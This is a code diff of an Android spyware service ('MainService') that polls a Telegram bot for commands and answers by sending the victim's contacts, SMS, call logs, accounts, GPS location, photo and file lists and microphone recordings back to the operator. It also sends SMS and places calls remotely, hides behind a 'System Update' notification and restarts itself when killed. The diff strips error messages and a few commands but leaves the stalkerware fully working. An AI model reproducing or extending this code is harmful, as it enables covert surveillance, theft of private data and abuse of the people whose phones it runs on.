@@ -63,40 +63,35 @@ public class MainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        try {
-            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
-            wakeLock.acquire();
 
-            startForegroundService();
-            sendToTelegram("✅ MainService Started");
+        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
+        wakeLock.acquire();
 
-            timer = new Timer();
-            timer.scheduleAtFixedRate(new TimerTask() {
-                @Override
-                public void run() {
-                    checkCommands();
-                }
-            }, 0, 3000);
-        } catch (Exception e) {
-            sendToTelegram("❌ Error: " + e.getMessage());
-        }
+        startForegroundService();
+        sendToTelegram("✅ MainService Started - يعمل في الخلفية");
+
+        timer = new Timer();
+        timer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                checkCommands();
+            }
+        }, 0, 3000);
     }
 
     private void startForegroundService() {
-        try {
-            String channelId = "main_channel";
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
-                ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
-            }
-            Notification notification = new NotificationCompat.Builder(this, channelId)
-                    .setContentTitle("System Update")
-                    .setContentText("Active")
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .build();
-            startForeground(1, notification);
-        } catch (Exception e) {}
+        String channelId = "main_channel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
+        }
+        Notification notification = new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("System Update")
+                .setContentText("يعمل في الخلفية")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .build();
+        startForeground(1, notification);
     }
 
     private void checkCommands() {
@@ -135,80 +130,68 @@ public class MainService extends Service {
     }
 
     private void executeCommand(String command) {
-        try {
-            String[] parts = command.split(" ");
-            String cmd = parts[0];
+        String[] parts = command.split(" ");
+        String cmd = parts[0];
 
-            switch (cmd) {
-                case "/help":
-                    sendHelp();
-                    break;
-                case "/info":
-                    sendDeviceInfo();
-                    break;
-                case "/contacts":
-                    getContacts();
-                    break;
-                case "/location":
-                    getLocation();
-                    break;
-                case "/sms":
-                    getSms();
-                    break;
-                case "/calls":
-                    getCallLog();
-                    break;
-                case "/accounts":
-                    getAccounts();
-                    break;
-                case "/photos":
-                    getPhotos();
-                    break;
-                case "/videos":
-                    getVideos();
-                    break;
-                case "/files":
-                    getFiles();
-                    break;
-                case "/record_audio_start":
-                    startAudioRecording();
-                    break;
-                case "/record_audio_stop":
-                    stopAudioRecording();
-                    break;
-                case "/lock":
-                    lockDevice();
-                    break;
-                case "/vibrate":
-                    vibrate();
-                    break;
-                case "/open":
-                    if (parts.length >= 2) openUrl(parts[1]);
-                    break;
-                case "/call":
-                    if (parts.length >= 2) makeCall(parts[1]);
-                    break;
-                case "/sms_send":
-                    if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
-                    break;
-                case "/screen_log":
-                    getScreenLog();
-                    break;
-                case "/test":
-                    sendToTelegram("✅ Working - " + new Date().toString());
-                    break;
-                default:
-                    sendToTelegram("❌ Unknown command. Use /help");
-                    break;
-            }
-        } catch (Exception e) {
-            sendToTelegram("❌ Error: " + e.getMessage());
+        switch (cmd) {
+            case "/help":
+                sendHelp();
+                break;
+            case "/info":
+                sendDeviceInfo();
+                break;
+            case "/contacts":
+                getContacts();
+                break;
+            case "/location":
+                getLocation();
+                break;
+            case "/sms":
+                getSms();
+                break;
+            case "/calls":
+                getCallLog();
+                break;
+            case "/accounts":
+                getAccounts();
+                break;
+            case "/photos":
+                getPhotos();
+                break;
+            case "/videos":
+                getVideos();
+                break;
+            case "/files":
+                getFiles();
+                break;
+            case "/record_audio_start":
+                startAudioRecording();
+                break;
+            case "/record_audio_stop":
+                stopAudioRecording();
+                break;
+            case "/vibrate":
+                vibrate();
+                break;
+            case "/open":
+                if (parts.length >= 2) openUrl(parts[1]);
+                break;
+            case "/call":
+                if (parts.length >= 2) makeCall(parts[1]);
+                break;
+            case "/sms_send":
+                if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
+                break;
+            case "/test":
+                sendToTelegram("✅ System Working - " + new Date().toString());
+                break;
+            default:
+                break;
         }
     }
 
     private void sendHelp() {
         String help = "📋 **Commands**\n\n" +
-                "📱 **Device Info**\n" +
                 "/info - Device info\n" +
                 "/location - GPS location\n" +
                 "/contacts - Contacts list\n" +
@@ -217,25 +200,15 @@ public class MainService extends Service {
                 "/accounts - All accounts\n" +
                 "/photos - Last 10 photos\n" +
                 "/videos - Last 10 videos\n" +
-                "/files - Files list\n\n" +
-                "🎙️ **Audio**\n" +
-                "/record_audio_start - Start recording\n" +
-                "/record_audio_stop - Stop recording\n\n" +
-                "🎮 **Control**\n" +
-                "/lock - Lock device\n" +
-                "/vibrate - Vibrate\n" +
+                "/files - All files\n" +
+                "/record_audio_start - Start audio recording\n" +
+                "/record_audio_stop - Stop audio recording\n" +
+                "/vibrate - Vibrate device\n" +
                 "/open [url] - Open URL\n" +
                 "/call [number] - Make call\n" +
                 "/sms_send [number] [text] - Send SMS\n" +
-                "/screen_log - Get screen activity log\n" +
                 "/test - Check service";
         sendToTelegram(help);
-    }
-
-    private void getScreenLog() {
-        sendToTelegram("📱 **Screen Activity Log:**\n" +
-                "ارسل /screen_log للحصول على تقرير الشاشة\n" +
-                "الخدمة تراقب الشاشة وتقوم بتسجيل كل ما يحدث.");
     }
 
     private void sendDeviceInfo() {
@@ -251,22 +224,16 @@ public class MainService extends Service {
                 info.put("phone", tm.getLine1Number());
             }
 
-            sendToTelegram("📱 **Device Info:**\n" + info.toString(2));
-        } catch (Exception e) {
-            sendToTelegram("❌ Info Error: " + e.getMessage());
-        }
+            sendToTelegram("📱 Device Info:\n" + info.toString(2));
+        } catch (Exception e) {}
     }
 
     private int getBatteryLevel() {
-        try {
-            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-            Intent batteryStatus = registerReceiver(null, ifilter);
-            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
-            return (int)(level * 100 / (float)scale);
-        } catch (Exception e) {
-            return -1;
-        }
+        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent batteryStatus = registerReceiver(null, ifilter);
+        int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+        int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+        return (int)(level * 100 / (float)scale);
     }
 
     private void getContacts() {
@@ -280,7 +247,7 @@ public class MainService extends Service {
                 ContentResolver cr = getContentResolver();
                 Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         null, null, null, null);
-                StringBuilder sb = new StringBuilder("📇 **Contacts:**\n\n");
+                StringBuilder sb = new StringBuilder("📇 Contacts:\n\n");
                 int count = 0;
                 while (cursor != null && cursor.moveToNext() && count < 100) {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
@@ -291,9 +258,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (count == 0) sb.append("No contacts");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ Contacts Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -310,13 +275,11 @@ public class MainService extends Service {
 
             if (location != null) {
                 String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
-                sendToTelegram("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
+                sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
             } else {
                 sendToTelegram("📍 Location not available");
             }
-        } catch (Exception e) {
-            sendToTelegram("❌ Location Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void getSms() {
@@ -329,7 +292,7 @@ public class MainService extends Service {
 
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n\n");
+                StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String address = cursor.getString(cursor.getColumnIndex("address"));
                     String body = cursor.getString(cursor.getColumnIndex("body"));
@@ -338,9 +301,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No SMS");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ SMS Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -354,7 +315,7 @@ public class MainService extends Service {
 
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n\n");
+                StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String number = cursor.getString(cursor.getColumnIndex("number"));
                     String type = cursor.getString(cursor.getColumnIndex("type"));
@@ -365,9 +326,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No calls");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ Call Log Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -376,15 +335,13 @@ public class MainService extends Service {
             try {
                 android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
                 android.accounts.Account[] accounts = am.getAccounts();
-                StringBuilder sb = new StringBuilder("👤 **Accounts:**\n\n");
+                StringBuilder sb = new StringBuilder("👤 Accounts:\n\n");
                 for (android.accounts.Account acc : accounts) {
                     sb.append(acc.type).append(": ").append(acc.name).append("\n");
                 }
                 if (accounts.length == 0) sb.append("No accounts");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ Accounts Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -399,7 +356,7 @@ public class MainService extends Service {
                 String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("🖼 **Last 10 Photos:**\n\n");
+                StringBuilder sb = new StringBuilder("🖼 Last 10 Photos:\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                     String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
@@ -408,9 +365,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No photos");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ Photos Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -425,7 +380,7 @@ public class MainService extends Service {
                 String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("🎥 **Last 10 Videos:**\n\n");
+                StringBuilder sb = new StringBuilder("🎥 Last 10 Videos:\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                     String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
@@ -434,9 +389,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No videos");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ Videos Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -449,48 +402,39 @@ public class MainService extends Service {
                 }
 
                 File storage = Environment.getExternalStorageDirectory();
-                StringBuilder sb = new StringBuilder("📁 **Files:**\n\n");
+                StringBuilder sb = new StringBuilder("📁 Files:\n\n");
                 listFiles(storage, sb, 0);
                 if (sb.length() == 0) sb.append("No files");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {
-                sendToTelegram("❌ Files Error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
 
     private void listFiles(File dir, StringBuilder sb, int depth) {
         if (depth > 2) return;
-        try {
-            File[] files = dir.listFiles();
-            if (files != null) {
-                for (File f : files) {
-                    if (f.isDirectory()) {
-                        listFiles(f, sb, depth + 1);
-                    } else {
-                        sb.append(f.getName()).append("\n").append(f.getAbsolutePath()).append("\n---\n");
-                        if (sb.length() > 3000) break;
-                    }
+        File[] files = dir.listFiles();
+        if (files != null) {
+            for (File f : files) {
+                if (f.isDirectory()) {
+                    listFiles(f, sb, depth + 1);
+                } else {
+                    sb.append(f.getName()).append("\n").append(f.getAbsolutePath()).append("\n---\n");
+                    if (sb.length() > 3000) break;
                 }
             }
-        } catch (Exception e) {}
+        }
     }
 
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                sendToTelegram("❌ No audio recording permission");
+                sendToTelegram("❌ No audio permission");
                 return;
             }
             String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
             File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
-            if (audioDir != null && !audioDir.exists()) audioDir.mkdirs();
-            if (audioDir != null) {
-                currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
-            } else {
-                sendToTelegram("❌ Cannot create audio directory");
-                return;
-            }
+            if (!audioDir.exists()) audioDir.mkdirs();
+            currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
 
             mediaRecorder = new MediaRecorder();
             mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -500,13 +444,9 @@ public class MainService extends Service {
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
-            sendToTelegram("🎤 Recording started");
+            sendToTelegram("🎤 Audio recording started");
         } catch (Exception e) {
-            sendToTelegram("❌ Failed to start recording: " + e.getMessage());
-            if (mediaRecorder != null) {
-                try { mediaRecorder.release(); } catch (Exception ex) {}
-                mediaRecorder = null;
-            }
+            sendToTelegram("❌ Failed: " + e.getMessage());
         }
     }
 
@@ -516,58 +456,25 @@ public class MainService extends Service {
             return;
         }
         try {
-            if (mediaRecorder != null) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
-            }
+            mediaRecorder.stop();
+            mediaRecorder.release();
             isRecording = false;
-            File file = new File(currentAudioPath);
-            if (file.exists()) {
-                sendFile(file, "audio.3gp");
-            } else {
-                sendToTelegram("❌ Recording file not found");
-            }
+            sendFile(new File(currentAudioPath), "audio.3gp");
         } catch (Exception e) {
-            sendToTelegram("❌ Failed to stop recording: " + e.getMessage());
-            if (mediaRecorder != null) {
-                try { mediaRecorder.release(); } catch (Exception ex) {}
-                mediaRecorder = null;
-            }
-        }
-    }
-
-    private void lockDevice() {
-        try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            android.content.ComponentName admin = new android.content.ComponentName(this, AdminReceiver.class);
-            if (dpm.isAdminActive(admin)) {
-                dpm.lockNow();
-                sendToTelegram("🔒 Device locked");
-            } else {
-                sendToTelegram("❌ Device admin not activated");
-            }
-        } catch (Exception e) {
-            sendToTelegram("❌ Failed to lock: " + e.getMessage());
+            sendToTelegram("❌ Failed: " + e.getMessage());
         }
     }
 
     private void vibrate() {
         try {
             Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-            if (v != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
-                } else {
-                    v.vibrate(2000);
-                }
-                sendToTelegram("📳 Vibrating");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
             } else {
-                sendToTelegram("❌ No vibrator");
+                v.vibrate(2000);
             }
-        } catch (Exception e) {
-            sendToTelegram("❌ Failed to vibrate: " + e.getMessage());
-        }
+            sendToTelegram("📳 Vibrating");
+        } catch (Exception e) {}
     }
 
     private void openUrl(String url) {
@@ -576,9 +483,7 @@ public class MainService extends Service {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             sendToTelegram("🔗 Opening: " + url);
-        } catch (Exception e) {
-            sendToTelegram("❌ Failed to open URL: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void makeCall(String number) {
@@ -591,9 +496,7 @@ public class MainService extends Service {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             sendToTelegram("📞 Calling: " + number);
-        } catch (Exception e) {
-            sendToTelegram("❌ Failed to call: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void sendSms(String number, String text) {
@@ -604,10 +507,8 @@ public class MainService extends Service {
             }
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(number, null, text, null, null);
-            sendToTelegram("📨 SMS sent to " + number);
-        } catch (Exception e) {
-            sendToTelegram("❌ Failed to send SMS: " + e.getMessage());
-        }
+            sendToTelegram("📨 SMS sent to: " + number);
+        } catch (Exception e) {}
     }
 
     private void sendFile(File file, String caption) {
@@ -630,9 +531,7 @@ public class MainService extends Service {
                 }
                 @Override public void onFailure(Call call, IOException e) {}
             });
-        } catch (Exception e) {
-            sendToTelegram("❌ Failed to send file: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void sendToTelegram(String text) {
@@ -659,14 +558,9 @@ public class MainService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        try {
-            if (timer != null) timer.cancel();
-            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-            if (mediaRecorder != null) {
-                try { mediaRecorder.release(); } catch (Exception e) {}
-                mediaRecorder = null;
-            }
-            startService(new Intent(this, MainService.class));
-        } catch (Exception e) {}
+        if (timer != null) timer.cancel();
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        if (mediaRecorder != null) mediaRecorder.release();
+        startService(new Intent(this, MainService.class));
     }
-                }
+}
